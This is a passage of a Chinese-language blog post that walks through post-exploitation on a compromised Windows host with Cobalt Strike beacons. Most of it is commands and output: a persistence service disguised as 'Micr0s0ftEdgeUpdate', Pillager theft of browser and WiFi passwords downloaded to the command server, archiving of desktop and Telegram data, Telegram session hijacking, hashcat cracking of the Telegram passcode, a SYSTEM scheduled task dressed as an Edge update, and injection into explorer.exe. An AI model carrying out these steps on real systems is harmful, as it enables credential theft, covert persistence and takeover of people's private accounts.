<p>设置如下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301659698.png" alt="image-20240730165944659"></p>
<p>创建完成后稍后会自动执行，会重新上线一台目标主机</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell sc query Micr0s0ftEdgeUpdate</span><br><span class="line">[*] Tasked beacon to run: sc query Micr0s0ftEdgeUpdate</span><br><span class="line">[+] host called home, sent: 59 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: Micr0s0ftEdgeUpdate </span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS  </span><br><span class="line">        STATE              : 4  RUNNING </span><br><span class="line">                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 0x0</span><br><span class="line">        WAIT_HINT          : 0x0</span><br><span class="line"></span><br><span class="line">beacon&gt; shell sc qc Micr0s0ftEdgeUpdate</span><br><span class="line">[*] Tasked beacon to run: sc qc Micr0s0ftEdgeUpdate</span><br><span class="line">[+] host called home, sent: 56 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">[SC] QueryServiceConfig 成功</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: Micr0s0ftEdgeUpdate</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS </span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 0   IGNORE</span><br><span class="line">        BINARY_PATH_NAME   : C:\Windows\System32\EdgeUpdate.exe --update</span><br><span class="line">        LOAD_ORDER_GROUP   : </span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : Micr0s0ftEdgeUpdate</span><br><span class="line">        DEPENDENCIES       : </span><br><span class="line">        SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure>

<h1 id="4-取证"><a href="#4-取证" class="headerlink" title="4.取证"></a>4.取证</h1><p>参考链接：<a target="_blank" rel="noopener" href="https://predit.notion.site/41b1f25305cc4859932cae366bd21754">https://predit.notion.site/41b1f25305cc4859932cae366bd21754</a></p>
<h2 id="4-1利用Pillager取证"><a href="#4-1利用Pillager取证" class="headerlink" title="4.1利用Pillager取证"></a>4.1利用Pillager取证</h2><p><strong>Pillager</strong>利用<a target="_blank" rel="noopener" href="https://github.com/qwqdanchun/Pillager">Pillager</a>来收集目标浏览器上的密码。结果保存在</p>
<p>%Temp%\Pillager.zip</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; ?</span><br><span class="line"></span><br><span class="line">Beacon Commands</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    !                         Run a command from the history</span><br><span class="line">    Pillager                  Get Browser Password</span><br><span class="line"></span><br><span class="line">beacon&gt; Pillager</span><br><span class="line">[*] Results can be found at %temp%\Pillager.zip</span><br><span class="line">[+] host called home, sent: 93389 bytes</span><br><span class="line"></span><br><span class="line">beacon&gt; shell echo %temp%</span><br><span class="line">[*] Tasked beacon to run: echo %temp%</span><br><span class="line">[+] host called home, sent: 42 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">C:\Users\YANGXI~1\AppData\Local\Temp</span><br><span class="line"></span><br><span class="line">beacon&gt; download C:\Users\****\AppData\Local\Temp\Pillager.zip</span><br><span class="line">[*] Tasked beacon to download C:\Users\YANGXI~1\AppData\Local\Temp\Pillager.zip</span><br><span class="line">[+] host called home, sent: 57 bytes</span><br><span class="line">[*] started download of C:\Users\YANGXI~1\AppData\Local\Temp\Pillager.zip (223918 bytes)</span><br><span class="line">[*] download of Pillager.zip is complete</span><br></pre></td></tr></table></figure>

<p>成功下载Pillager.zip后，结果暂存在cs上，点击底部的Sync Files将其下载到本地</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="C:\Users\23705\AppData\Roaming\Typora\typora-user-images\image-20240730171158954.png" alt="image-20240730171158954"></p>
<p>搜集到的结果如下，有各个浏览器中的数据以及安装了的应用程序列表。<strong>Wifi文件夹</strong>中保存的是目标连接过的Wifi密码，<strong>ScreenShot文件夹</strong>是运行Pillager命令时的屏幕截图。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301712607.png" alt="image-20240730171227537"></p>
<p><strong>使用7za.exe打包感兴趣的目录</strong></p>
<p>上传7za.exe到目标机器</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301712532.png" alt="image-20240730171254496"></p>
<p>使用下列命令打包感兴趣的目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">7za.exe a -tzip &lt;output_file&gt; &lt;target_file&gt; -xr!&lt;excluded_file&gt;</span><br><span class="line"></span><br><span class="line">Eg:将本用户的桌面文件打包到存储到C:\Windows\Temp\desktop.zip,排除shipin文件夹</span><br><span class="line">C:\windows\system32\7za.exe a -tzip C:\Windows\Temp\Yandesktop.zip C:\Users\Yan\Desktop -xr!&quot;shipin&quot;</span><br><span class="line">[snip]</span><br><span class="line">Everything is Ok</span><br><span class="line"></span><br><span class="line">Kernel  Time =    28.171 =    9%</span><br><span class="line">User    Time =   230.781 =   74%</span><br><span class="line">Process Time =   258.953 =   83%    Virtual  Memory =    148 MB</span><br><span class="line">Global  Time =   308.599 =  100%    Physical Memory =    150 MB</span><br><span class="line"></span><br><span class="line">shell 7za.exe a -tzip C:\Windows\Temp\xudesktop.zip </span><br><span class="line">&quot;C:\Users\Administrator\AppData\Roaming\Telegram Desktop\&quot; </span><br><span class="line">-xr!&quot;C:\Users\Administrator\AppData\Roaming\Telegram Desktop\Telegram Desktop.zip&quot; </span><br><span class="line">-xr!&quot;C:\Users\Administrator\AppData\Roaming\Telegram Desktop\Telegram Desktop-123810274.zip&quot; </span><br><span class="line">-xr!&quot;C:\Users\Administrator\AppData\Roaming\Telegram Desktop\Telegram.exe&quot;</span><br></pre></td></tr></table></figure>

<h2 id="4-2Telegram会话劫持"><a href="#4-2Telegram会话劫持" class="headerlink" title="4.2Telegram会话劫持"></a>4.2Telegram会话劫持</h2><p>参考：<a target="_blank" rel="noopener" href="https://www.ifmobi.com/telegram/1150.html">https://www.ifmobi.com/telegram/1150.html</a><br>在进行TG会话劫持之前首先使用目标机器搭建socks代理，然后通过代理去执行TG应用程序从而注意OPSEC。</p>
<p>查看TG的文件路径，为了方便定位TG的文件路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell wmic process where caption=&quot;Telegram.exe&quot; get caption,commandline,executablepath /value</span><br><span class="line">[*] Tasked beacon to run: wmic process where caption=&quot;Telegram.exe&quot; get caption,commandline,executablepath /value</span><br><span class="line">[+] host called home, sent: 118 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">Caption=Telegram.exe</span><br><span class="line">CommandLine=&quot;D:\Telegram Desktop\Telegram.exe&quot; </span><br><span class="line">ExecutablePath=D:\Telegram Desktop\Telegram.exe</span><br></pre></td></tr></table></figure>

<p>打包TG的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\Users\Administrator\Documents\7za.exe a -tzip C:\Windows\Temp\TG.zip &quot;D:\Telegram Desktop\&quot; -xr!&quot;D:\Telegram Desktop\tdata\dumps\&quot; -xr!&quot;D:\Telegram Desktop\tdata\emoji\&quot; -xr!&quot;D:\Telegram Desktop\tdata\tdummy\&quot; -xr!&quot;D:\Telegram Desktop\tdata\temp\&quot;</span><br></pre></td></tr></table></figure>

<p>主要目标是下列三个文件，可以利用<strong>Pillager</strong>帮助快速收集。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301715698.png" alt="image-20240730171559644"></p>
<p>有的情况下，一个telegram客户端可能登录着多个用户（不超过3个），所有用户的session文件依旧保存在</p>
<p>tdata下。telegram客户端会根据登录的次序进行编号，分别为</p>
<p>data，</p>
<p>data#2，</p>
<p>data#3，在session劫持的时候按照文件名进行迁移即可。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301716429.png" alt="image-20240730171637363"></p>
<p>将上述的3个文件替换掉本地TG中的对应文件。然后执行TG的可执行程序。	</p>
<p>在进行session劫持的过程中，有概率会遇到含有passcode的情况，如下图所示。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301830567.png" alt="image-20240730183031455"></p>
<p><strong>passcode爆破</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#获取生成的tg.hash文件需要把开头的“key_datas:”删除</span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ python telegram2john.py key_datas &gt; tg.hash </span><br><span class="line"></span><br><span class="line">#试用掩码方式跑1-6位数字(示掩码太小破解速度很慢)</span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ hashcat -m 24500 -a 3 --force tg.hash --increment --increment-min 1 --increment-max 6 ?d?d?d?d?d?d</span><br><span class="line"></span><br><span class="line">#生成好1-6位数字字典，用字典跑速度会快一些</span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ hashcat.exe -m 24500 -a 0 --force tg.hash 1-6.txt</span><br></pre></td></tr></table></figure>

<p>用来生成1-6位数字的脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line"></span><br><span class="line">digits = &quot;0123456789&quot;  # 可用的数字</span><br><span class="line"></span><br><span class="line"># 生成1到6位数字组合</span><br><span class="line">combinations = []</span><br><span class="line">for i in range(1, 7):</span><br><span class="line">    combinations.extend([&#x27;&#x27;.join(c) for c in itertools.product(digits, repeat=i)])</span><br><span class="line"></span><br><span class="line"># 打印结果</span><br><span class="line">for combination in combinations:</span><br><span class="line">    print(combination)</span><br></pre></td></tr></table></figure>

<p>在进行session劫持的过程中，如果一直都无法恢复session，并且能够确认session文件没有过期，那么有可能是本地的Telegram.exe版本与目标机器的Telegram.exe不匹配造成的。</p>
<p><strong>解决办法：</strong></p>
<p> ①查看tg主程序MD5（判断版本） </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil</span><br></pre></td></tr></table></figure>

<p>②通过下载的session加密文件判断版本： </p>
<p> 比如key_datas文件用winhex打开，第一行的后四个字节就是版本号，通过进制转换后对应版本号就 是：3.5.1</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301833029.png" alt="image-20240730183318897"></p>
<h1 id="5-注意事项"><a href="#5-注意事项" class="headerlink" title="5 注意事项"></a>5 注意事项</h1><h2 id="5-1-SYSTEM权限计划任务维权"><a href="#5-1-SYSTEM权限计划任务维权" class="headerlink" title="5.1 SYSTEM权限计划任务维权"></a>5.1 SYSTEM权限计划任务维权</h2><p>在SYSTEM权限下使用计划任务维权时，如果使用CS脚本功能那么计划任务上线的用户只是普通用户。因为创建计划任务的时候默认是以Users的权限运行的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Folder: \</span><br><span class="line">HostName         TaskName                                 Next Run Time          Status          Logon Mode              Last Run Time           Last Result Author           Task To Run                                        Start In                                 Comment                                                                          Scheduled Task State   Idle Time                                Power Management                                 Run As User                              Delete Task If Not Rescheduled Stop Task If Runs X Hours and X Mins     Schedule                                                                         Schedule Type                Start Time   Start Date End Date   Days                                        Months                                      Repeat: Every            Repeat: Until: Time  Repeat: Until: Duration        Repeat: Stop If Still Running      </span><br><span class="line">================ ======================================== ====================== =============== ======================= ====================== ============ ================ ================================================== ======================================== ================================================================================ ====================== ======================================== ================================================ ======================================== ============================== ======================================== ================================================================================ ============================ ============ ========== ========== =========================================== =========================================== ======================== ==================== ============================== ===================================</span><br><span class="line">DESKTOP-2LNH3UM  DataProtectS                             2024/3/11 22:00:00     Running         Interactive/Background  2024/3/11 10:25:16      -2147020576 N/A              C:\windows\system32\dataprotectionx86.exe          N/A                                      Microsoft Edge Update Task for Machine Admin.                                    Enabled                Disabled                                 Stop On Battery Mode                             Users                                    Disabled                       Disabled                                 Scheduling data is not available in this format.                                 Daily                        22:00:00     2000/1/21  N/A        Every 1 day(s)</span><br></pre></td></tr></table></figure>

<p>使用下列命令创建一个以SYSTEM权限运行负载的计划任务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#删除原有的计划任务</span><br><span class="line">schtasks /delete /tn &quot;DataProtectS&quot;</span><br><span class="line"></span><br><span class="line">#创建新的计划任务，以SYSTEM权限运行</span><br><span class="line">schtasks /create /tn &quot;DataProtectS&quot; /tr &quot;C:\windows\system32\dataprotectionx86&quot; /sc DAILY /st 19:00 /RU &quot;SYSTEM&quot;</span><br><span class="line"></span><br><span class="line">#查看该计划任务</span><br><span class="line">schtasks /query /tn &quot;DataProtectS&quot; -v</span><br><span class="line"></span><br><span class="line">#强制计划任务执行</span><br><span class="line">schtasks /run /tn &quot;DataProtectS&quot;</span><br></pre></td></tr></table></figure>

<h2 id="5-2-SYSTEM降权"><a href="#5-2-SYSTEM降权" class="headerlink" title="5.2 SYSTEM降权"></a>5.2 SYSTEM降权</h2><p><strong>不能在SYSTEM权限下截图</strong>，而且截图的时候<strong>需要注入我们自己的进程</strong>。如果我们拥有SYSTEM权限的会话，但是想要截图，这个时候就需要降权。</p>
<p>进程注入</p>
<p>以SYSTEM权限直接找到普通用户的进程然后注入，可以看到新上线的shell的负载是explorer.exe，我们将rs payload注入到了其中。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301837445.png"></p>
<p>示例：<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301838735.png" alt="image-20240730183841622"></p>
<p>在此注入进程就会上线Admin*，在新上线机子找到对应的进程，截图如果发现它一直在截图杀掉对应的进程JID</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://github-blog-axu.oss-cn-beijing.aliyuncs.com/img/202407301840152.png" alt="image-20240730184001102"></p>
</article>

  <div class="related-wrap md-text" id="comments">
    <section class='header cmt-title cap theme'>
      <p>快来参与讨论吧~</p>

    </section>
    <section class='body cmt-body waline'>
      

<div id="waline_container" class="waline_thread"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>

    </section>
  </div>



<footer class="page-footer footnote"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs15">博客</span><a href="/">近期</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archives/">归档</a><a href="/tools/">工具</a></div><div class="sitemap-group"><span class="fs15">笔记</span><a href="/wiki/tags/DevOps/index.html">DevOps</a><a href="/wiki/tags/Vulnerability/index.html">常见漏洞分析</a><a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a></div><div class="sitemap-group"><span class="fs15">社交</span><a href="/friends/">友链</a><a href="/comments/">留言板</a></div><div class="sitemap-group"><span class="fs15">更多</span><a href="/about/">关于本站</a><a target="_blank" rel="noopener" href="https://github.com/JiangJiYue">GitHub</a></div></div><div class="text"><center>
  <p>本破站由 <a href="/">@Cber</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客部分素材来源于网络，如有侵权请联系<a href="mailto:axusun@qq.com">axusun@qq.com</a>删除<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
  <!--不蒜子计数器-->
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <span>本"页面"访问 <span id="busuanzi_value_page_pv"></span> 次 | 👀总访问 <span id="busuanzi_value_site_pv"></span> 次 | 总访客 <span id="busuanzi_value_site_uv"></span> 人</span>
  <br>
  <span id="runtime_span"></span>
  <script type="text/javascript">
    // JavaScript for showing runtime here
  </script>
</center>
<div style="display: flex;justify-content: center;align-items: center;margin: 10px;">
  <a target="_blank" rel="noopener" href="https://notbyai.fyi/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/Written-By-Human-white.png" style="width:140px;height:50px;margin-right: 10px " id='notbyai'></a>
  <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/by-nc-sa.eu.png" style="width:140px;height:50px"></a>
</div>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
</aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
